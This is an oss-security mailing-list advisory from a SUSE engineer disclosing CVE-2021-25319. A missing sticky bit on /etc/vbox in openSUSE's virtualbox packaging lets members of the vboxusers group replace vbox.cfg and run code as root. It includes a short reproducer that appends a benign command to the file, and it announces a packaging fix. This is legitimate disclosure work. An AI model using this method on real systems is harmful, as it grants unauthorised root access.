X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3347" "Monday" "26" "April" "2021" "15:41:17" "+0200" "Matthias Gerstner" "mgerstner@suse.de" nil "87" "[oss-security] virtualbox: CVE-2021-25319: missing sticky bit in openSUSE packaging for /etc/box allows local root exploit for members of vboxusers group" nil nil nil "4" nil nil (number mark "U       mgerstner@su Apr 26   87/3347  " thread-indent "\"[oss-security] virtualbox: CVE-2021-25319: missing sticky bit in openSUSE packaging for /etc/box allows local root exploit for members of vboxusers group\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] virtualbox: CVE-2021-25319: missing sticky bit in openSUSE packaging for /etc/box allows local root exploit for members of vboxusers group" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 3661 invoked by uid 550); 26 Apr 2021 13:41:31 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 3640 invoked from network); 26 Apr 2021 13:41:31 -0000
X-Virus-Scanned: by amavisd-new at test-mx.suse.de
Date: Mon, 26 Apr 2021 15:41:17 +0200
From: Matthias Gerstner <mgerstner@suse.de>
To: oss-security@lists.openwall.com
Message-ID: <YIbC/ejOYMYVFOPM@f195.suse.de>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
	protocol="application/pgp-signature"; boundary="D24RobCn7UadMVn1"
Content-Disposition: inline
Subject: [oss-security] virtualbox: CVE-2021-25319: missing sticky bit in openSUSE packaging
 for /etc/box allows local root exploit for members of vboxusers group

--D24RobCn7UadMVn1
Content-Type: text/plain; charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

Hi,

somewhat related to CVE-2021-2264 I noticed an openSUSE specific
security issue in the openSUSE packaging for virtualbox [1]. To enable
the autostart feature in virtualbox as outlined in the upstream manual
[2] our packagers introduced a group 'vboxusers' that is granted write
access to the directory /etc/vbox as the "autostart DB". Contrary to
what the manual says the directory was not packaged with the sticky bit
set, however.

The file /etc/vbox/vbox.cfg is a configuration file for virtualbox. This
file is sourced by other virtualbox bash scripts running as root like
'vboxautostart.sh', 'vboxdrv.sh' and 'vboxweb-service.sh'. Due to the
missing sticky bit any member of the vboxusers group can replace the
/etc/vbox/vbox.cfg file by a manipulated one, allowing for full code
execution in the context of the root user once e.g. the vboxautostart
systemd service runs.

Reproducer:

    root# su -g vboxusers nobody
    nobody$ cd /etc/vbox
    nobody$ cp vbox.cfg vbox.cfg.new
    nobody$ rm -f vbox.cfg
    nobody$ mv vbox.cfg.new vbox.cfg
    nobody$ echo "touch /root/evil" >>vbox.cfg
=20=20=20=20
    nobody$ exit
    root# systemctl start vboxautostart.service
    root# ls -lh /root/evil
    -rw-r--r-- 1 root root 0  2. M=E4r 12:14 /root/evil

I have been looking into other distributions like Arch Linux, Fedora and
also some of the RPMs distributed on www.virtualbox.org. They all
package /etc/vbox as root:root mode 755 and are therefore not affected.

Updates for the openSUSE virtualbox packages are underway [3] that will
fix the packaging error and also move the "autostart DB" directory from
/etc/vbox to /etc/vbox/autostart.d to avoid mixing the autostart related
files with the virtualbox system configuration file in the same
directory.

Cheers

Matthias

[1]: https://build.opensuse.org/package/show/Virtualization/virtualbox
[2]: https://www.virtualbox.org/manual/ch09.html#autostart-linux
[3]: https://bugzilla.suse.com/show_bug.cgi?id=3D1182918

--=20
Matthias Gerstner <matthias.gerstner@suse.de>
Dipl.-Wirtsch.-Inf. (FH), Security Engineer
https://www.suse.com/security
Phone: +49 911 740 53 290
GPG Key ID: 0x14C405C971923553
=20
SUSE Software Solutions Germany GmbH
HRB 36809, AG N=FCrnberg
Gesch=E4ftsf=FChrer: Felix Imend=F6rffer

--D24RobCn7UadMVn1
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQIzBAABCAAdFiEE82oG1A8ab1eESZdjFMQFyXGSNVMFAmCGwv0ACgkQFMQFyXGS
NVMFUA/8C58CiIu6akceqxxVqowX1KWjQuGN9uQs9gqEonVHBtT1MRFSREoYGMi0
Ou4kZS3Yy7CXzCc8Rz0vGYVcbFpekmczet+KAG9X0G3AnFiuvH68yazGvWQHN7gB
wMHQBkdk/BA8ZVEe2Jgcq38WmGKtDgy8Rs7apmhSRBwdtAyWOCOzWols3FQFL9gw
TJoobKneLRJDShWYWW8zcPgYePn+7RjJeJ99tyaM4Tt9rApRzdfjhBmUYR3xlsSY
Xkzrp9h4PSsqJiawbcTcznRARKnFsdKhOorlV2G4IHRg6k37sPjNAHuds/nus7/Y
KM+7lkTqS8GM196JY7eD7soe9DGMu/gYwNhJnLs4gWuog0fF01ep4MvcJ5+LraFi
bhhJesQNcsDjjZbE52jrkaZnWLWBCUwuld0Pap6ofjc5XTZCA88/1xKiWjm/t5iE
aQs4i3n+wwqaKRXogDbCgCdTmtofK4n2heH1RuKVnq5HbCYPLY5bVOzFK7YM0dRh
79WabFmPQJnCVJklcQojVD79TzaDD7msMjBLfORe1j7Hd3q93jXXiP7PVmqT6UVx
dSD6ktZ0xzJ+kkvcYmKjvRGl5hoLxTszJXxnmSx/Mim+pEWb844gWgwp1gwuMP46
HvFQZx6VJx41u4tirzqhZVNznqu4koimoE4wI2HYuM8SsI7dVOI=
=9aEo
-----END PGP SIGNATURE-----

--D24RobCn7UadMVn1--
